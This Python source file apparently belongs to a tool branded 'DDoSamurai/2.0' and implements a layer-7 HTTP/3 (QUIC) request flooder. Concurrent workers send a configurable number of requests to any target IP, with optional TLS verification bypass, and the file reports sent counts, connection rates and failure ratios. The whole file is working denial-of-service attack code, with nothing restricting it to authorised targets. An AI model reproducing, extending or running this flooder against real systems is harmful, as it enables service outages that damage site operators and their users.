from __future__ import annotations

import asyncio
import os
import ssl
import time
from typing import Any, Dict, Tuple

try:
    from aioquic.asyncio.client import connect
    from aioquic.asyncio.protocol import QuicConnectionProtocol
    from aioquic.h3.connection import H3_ALPN, H3Connection
    from aioquic.h3.events import DataReceived, HeadersReceived
    from aioquic.quic.configuration import QuicConfiguration

    _AIOQUIC_AVAILABLE = True
except Exception:  # pragma: no cover - dependency is optional
    _AIOQUIC_AVAILABLE = False


def _env_flag(name: str, default: str = "1") -> bool:
    raw = str(os.environ.get(name, default) or default).strip().lower()
    return raw in {"1", "true", "yes", "on"}


def supported() -> bool:
    return bool(_AIOQUIC_AVAILABLE and _env_flag("SAMURAI_L7_QUIC_PY_BRIDGE_ENABLE", "1"))


def stack_mode() -> str:
    if supported():
        return "h3_stateful_py"
    return "unavailable"


class _H3ClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._h3_conn = H3Connection(self._quic)
        self._stream_waiters: Dict[int, asyncio.Future] = {}

    async def request(self, *, method: str, path: str, authority: str, timeout_s: float) -> int:
        stream_id = self._quic.get_next_available_stream_id()
        loop = getattr(self, "_loop", None) or asyncio.get_running_loop()
        fut = loop.create_future()
        self._stream_waiters[stream_id] = fut
        self._h3_conn.send_headers(
            stream_id=stream_id,
            headers=[
                (b":method", str(method or "GET").encode()),
                (b":path", str(path or "/").encode()),
                (b":scheme", b"https"),
                (b":authority", str(authority or "").encode()),
                (b"user-agent", b"DDoSamurai/2.0"),
            ],
            end_stream=True,
        )
        self.transmit()
        try:
            status_code = await asyncio.wait_for(fut, timeout=max(0.05, float(timeout_s or 3.0)))
            return int(status_code or 0)
        finally:
            self._stream_waiters.pop(stream_id, None)

    def connection_lost(self, exc):  # pragma: no cover - exercised by integration tests
        err = exc or ConnectionError("quic_connection_lost")
        for fut in list(self._stream_waiters.values()):
            if not fut.done():
                fut.set_exception(err)
        self._stream_waiters.clear()
        super().connection_lost(exc)

    def quic_event_received(self, event):  # pragma: no cover - exercised by integration tests
        for http_event in self._h3_conn.handle_event(event):
            stream_id = getattr(http_event, "stream_id", None)
            if stream_id is None:
                continue
            fut = self._stream_waiters.get(int(stream_id))
            if fut is None or fut.done():
                continue
            if isinstance(http_event, HeadersReceived):
                status = 0
                for name, value in list(http_event.headers or []):
                    if name == b":status":
                        try:
                            status = int(value.decode("ascii", errors="ignore") or "0")
                        except Exception:
                            status = 0
                        break
                if bool(getattr(http_event, "stream_ended", False)):
                    fut.set_result(status)
            elif isinstance(http_event, DataReceived):
                if bool(getattr(http_event, "stream_ended", False)):
                    fut.set_result(0)


def _split_work(total: int, workers: int, worker_id: int) -> int:
    if total <= 0:
        return 0
    w = max(1, min(int(workers or 1), total))
    base = total // w
    rem = total % w
    return base + (1 if worker_id < rem else 0)


def _normalize_input(payload: Dict[str, Any]) -> Tuple[int, int, int, str, str, str, bool, float]:
    attempted = max(0, int(payload.get("count", 0) or 0))
    repeats = max(1, int(payload.get("session_repeats", 1) or 1))
    if attempted > 0 and repeats > 1:
        attempted = attempted * repeats
    concurrency = max(1, int(payload.get("concurrency", 1) or 1))
    retries = max(0, min(8, int(payload.get("retries", 0) or 0)))
    method = str(payload.get("quic_method", payload.get("http_method", "GET")) or "GET").upper()
    path = str(payload.get("quic_path", payload.get("http_path", "/")) or "/")
    target_ip = str(payload.get("target_ip", "") or "")
    verify_tls = bool(payload.get("verify", True))
    timeout_s = float(payload.get("timeout_s", 3.0) or 3.0)
    if timeout_s <= 0.0:
        timeout_s = 3.0
    return attempted, concurrency, retries, method, path, target_ip, verify_tls, timeout_s


async def run_stateful(payload: Dict[str, Any]) -> Dict[str, Any]:
    attempted, concurrency, retries, method, path, target_ip, verify_tls, timeout_s = _normalize_input(payload)
    if attempted <= 0:
        return {
            "attempted": 0,
            "sent": 0,
            "errors": 0,
            "sender_path": "C_STATE_QUIC",
            "sender_fallback_reason": "none",
            "quic_stack_mode": stack_mode(),
        }

    if not supported():
        return {
            "attempted": attempted,
            "sent": 0,
            "errors": attempted,
            "sender_path": "C_STATE_QUIC_UNAVAILABLE",
            "sender_fallback_reason": "quic_capability_unavailable",
            "quic_stack_mode": "unavailable",
            "quic_stack_probe_reason": "aioquic_unavailable",
            "quic_connect_fail_count": 0,
            "quic_connect_timeout_count": 0,
            "quic_tls_fail_count": 0,
            "quic_handshake_timeout_count": 0,
            "quic_stream_fail_count": attempted,
            "quic_stream_fail_ratio": 1.0,
            "quic_handshake_fail_ratio": 0.0,
            "retry_budget": retries,
            "retry_attempts": 0,
            "retry_successes": 0,
        }

    target_port = int(payload.get("target_port", 443) or 443)
    if target_port <= 0 or target_port > 65535:
        return {
            "attempted": attempted,
            "sent": 0,
            "errors": attempted,
            "sender_path": "C_STATE_QUIC",
            "sender_fallback_reason": "target_port_invalid",
            "quic_stack_mode": stack_mode(),
        }

    if not target_ip:
        return {
            "attempted": attempted,
            "sent": 0,
            "errors": attempted,
            "sender_path": "C_STATE_QUIC",
            "sender_fallback_reason": "target_ip_missing",
            "quic_stack_mode": stack_mode(),
        }

    sent_total = 0
    connect_fail_count = 0
    stream_fail_count = 0
    retry_attempts = 0
    retry_successes = 0
    active_peak = 0

    lock = asyncio.Lock()
    workers = max(1, min(concurrency, attempted))
    started_at = time.perf_counter()

    async def _inc(name: str, delta: int = 1) -> None:
        nonlocal sent_total, connect_fail_count, stream_fail_count, retry_attempts, retry_successes
        async with lock:
            if name == "sent":
                sent_total += int(delta)
            elif name == "connect_fail":
                connect_fail_count += int(delta)
            elif name == "stream_fail":
                stream_fail_count += int(delta)
            elif name == "retry_attempts":
                retry_attempts += int(delta)
            elif name == "retry_successes":
                retry_successes += int(delta)

    async def _worker(worker_id: int) -> None:
        nonlocal active_peak
        my_count = _split_work(attempted, workers, worker_id)
        if my_count <= 0:
            return

        qcfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
        if not verify_tls:
            qcfg.verify_mode = ssl.CERT_NONE

        try:
            async with connect(
                target_ip,
                target_port,
                configuration=qcfg,
                create_protocol=_H3ClientProtocol,
                wait_connected=True,
            ) as protocol:
                proto = protocol  # type: ignore[assignment]
                async with lock:
                    active_peak = max(active_peak, workers)
                for _ in range(my_count):
                    ok = False
                    for attempt_idx in range(retries + 1):
                        if attempt_idx > 0:
                            await _inc("retry_attempts", 1)
                        try:
                            await proto.request(
                                method=method,
                                path=path,
                                authority=target_ip,
                                timeout_s=timeout_s,
                            )
                            await _inc("sent", 1)
                            if attempt_idx > 0:
                                await _inc("retry_successes", 1)
                            ok = True
                            break
                        except Exception:
                            if attempt_idx >= retries:
                                await _inc("stream_fail", 1)
                    if not ok:
                        continue
        except Exception:
            await _inc("connect_fail", my_count)

    await asyncio.gather(*[asyncio.create_task(_worker(idx)) for idx in range(workers)])

    elapsed_s = max(0.0, time.perf_counter() - started_at)
    errors_total = max(0, attempted - sent_total)
    final_reason = "none"
    if errors_total > 0:
        final_reason = "connect_fail" if connect_fail_count >= stream_fail_count else "stream_fail"

    retry_success_rate = 0.0
    if retry_attempts > 0:
        retry_success_rate = 100.0 * (float(retry_successes) / float(retry_attempts))

    return {
        "attempted": attempted,
        "sent": sent_total,
        "errors": errors_total,
        "sender_path": "C_STATE_QUIC_H3PY",
        "sender_fallback_reason": final_reason,
        "l7_active_sessions_peak": int(active_peak),
        "l7_conn_rate": float(sent_total / elapsed_s) if elapsed_s > 0.0 else 0.0,
        "l7_handshake_p99_ms": 0.0,
        "l7_step_fail_ratio": float(errors_total) / float(max(1, attempted)),
        "session_success_rate": (100.0 * float(sent_total) / float(max(1, attempted))),
        "retry_success_rate": retry_success_rate,
        "retry_attempts": int(retry_attempts),
        "retry_successes": int(retry_successes),
        "retry_budget": int(retries),
        "quic_stack_mode": stack_mode(),
        "quic_stack_probe_reason": "aioquic_bridge_ready",
        "quic_connect_fail_count": int(connect_fail_count),
        "quic_connect_timeout_count": 0,
        "quic_tls_fail_count": 0,
        "quic_handshake_timeout_count": 0,
        "quic_stream_fail_count": int(stream_fail_count),
        "quic_stream_fail_ratio": float(stream_fail_count) / float(max(1, attempted)),
        "quic_handshake_fail_ratio": 0.0,
    }
